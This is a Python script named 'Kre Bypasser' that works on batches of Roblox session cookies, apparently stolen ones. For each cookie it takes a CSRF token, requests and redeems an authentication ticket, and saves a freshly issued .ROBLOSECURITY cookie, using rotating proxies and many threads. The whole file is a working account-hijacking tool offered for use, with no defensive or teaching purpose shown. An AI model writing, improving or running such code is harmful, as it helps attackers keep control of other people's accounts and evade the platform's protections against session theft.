import requests
from threading import Thread
import pyfiglet
from random import randint
from rich import print
title = pyfiglet.figlet_format('Kre \n Bypasser')
proxies = open("proxies.txt").read()
print(f'[red]{title}[/red]')

url = "https://auth.roblox.com/v1/authentication-ticket"
def get_proxy():
    lines = proxies.split("\n")
    num_lines = len(lines)
    i = randint(0, num_lines - 1)
    return lines[i]
def csrf(cookie, proxy):
 try:
    csr = requests.post(
        "https://friends.roblox.com/v1/contacts/1/request-friendship",
        cookies={".ROBLOSECURITY": cookie},
        proxies={"https": f"http://{proxy}", "http": f"http://{proxy}"},
    ).headers
    # print(csr)
    return csr["x-csrf-token"]
 except:
     print("[red]Invalid cookie[/red]" )
     pass


def get_tick(cookie, proxy, xcsrf):
    headers={
        "Cookie": f".ROBLOSECURITY={cookie}",
        "x-csrf-token": xcsrf,
        "referer": "https://www.roblox.com/"
    }
    proxies = {"https": f"http://{proxy}", "http": f"http://{proxy}"}
    req = requests.post(url, headers=headers, proxies=proxies)
    return req.headers["rbx-authentication-ticket"]

def get_cookie(ticket, proxy, xcsrf):
    headers={
        "x-csrf-token": xcsrf,
        "referer": "https://www.roblox.com/my/account",
        "rbxauthenticationnegotiation": "1",
    }
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    data={"authenticationTicket": ticket}
    req = requests.post(f"{url}/redeem", headers=headers, json=data,proxies=proxies)
    print(req.text)
    return str(req.headers["set-cookie"].split(".ROBLOSECURITY=")[1].split(";")[0])
def main(cookie):
 bcookies = open("bypassed_cookies.txt","a")
 proxy = get_proxy()
 try:
    xcsrf = csrf(cookie, proxy)
    ticket = get_tick(cookie, proxy, xcsrf)
    newcookie = get_cookie(ticket,proxy, xcsrf)
    bcookies.write(newcookie + "\n")
    print("[green]Successfully bypassed[/green]")
 except: 
     print("[red]Invalid Cookie[/red]")
     pass
cookies = open("cookies.txt").read().splitlines()

threads = []
print("[yellow]How many threads?[/yellow]")
for i in range(int(input(""))):
    thread_cookies = cookies[i::4]
    thread = Thread(
        target=lambda *c: [main(cookie) for cookie in c], args=thread_cookies
    )
    thread.start()
    threads.append(thread)

for thread in threads:
    thread
